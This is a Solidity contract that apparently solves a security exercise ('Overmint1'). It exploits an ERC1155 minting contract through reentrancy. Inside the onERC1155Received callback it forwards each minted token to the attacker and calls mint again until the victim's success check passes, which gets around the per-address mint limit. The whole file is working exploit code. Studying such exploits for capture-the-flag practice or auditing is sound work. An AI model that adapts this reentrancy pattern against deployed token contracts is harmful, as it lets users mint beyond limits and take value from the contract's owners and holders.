import {IERC1155Receiver, IERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

interface Victim is IERC1155 {
    function mint(uint256 id, bytes calldata data) external;
    function success(address _attacker, uint256 id) external view returns (bool);
}

contract Overmint1_ERC1155_Attacker {
    address attacker;
    Victim victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    function attack() external {
        attacker = msg.sender;
        victim.mint(0, hex"");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 amount, bytes calldata data)
        external
        returns (bytes4 response)
    {
        victim.safeTransferFrom(address(this), attacker, id, amount, hex"");

        if (!victim.success(attacker, 0)) {
            victim.mint(0, hex"");
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }
}
